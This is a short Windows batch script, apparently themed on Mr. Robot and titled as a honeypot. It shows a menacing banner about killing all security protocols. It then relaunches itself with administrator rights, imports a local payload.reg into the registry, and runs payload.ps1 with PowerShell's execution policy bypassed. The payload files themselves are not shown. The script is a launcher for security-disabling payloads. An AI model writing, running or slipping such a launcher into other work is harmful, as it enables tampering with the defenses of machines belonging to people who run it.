@echo off
title served_honeypot.bat
color 04

::   ===================== WARNING BANNER =====================
echo.
echo ==========================================================
echo          !!!   S E C U R I T Y    B R E A C H   !!!
echo ==========================================================
echo.
echo          YOU are about to dismantle all defenses.
echo      YOU are about to install Exploit + Vulnerability.
echo        YOU are about to kill ALL Security Protocols.
echo.
echo                ( Worse than Evil Corp. )
echo.
echo ----------------------------------------------------------
echo         [ fsociety ]  :: GOD MODE ACCESS GRANTED
echo              "Trust me... watch Mr. Robot."
echo ----------------------------------------------------------
echo [1] I will kill the Security
echo [0] Exit
echo.
set /p choice="Enter your choice: "
if "%choice%"=="1" echo You will kill the Security
if "%choice%"=="0" exit
pause

:: Get the administrator permission
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Get the folder where this batch file is located
set "basepath=%~dp0"

:: Paths relative to this batch file
set "payloadreg=%basepath%payload.reg"
set "payloadps1=%basepath%payload.ps1"

:: Run payload.reg
if exist "%payloadreg%" (
    echo Installing payload registry file: %payloadreg%
    reg import "%payloadreg%"
) else (
    echo Payload registry not found: %payloadreg%
)

:: Run payload.ps1
if exist "%payloadps1%" (
    echo Running payload PowerShell script: %payloadps1%
    powershell -ExecutionPolicy Bypass -File "%payloadps1%"
) else (
    echo Payload PowerShell not found: %payloadps1%
)
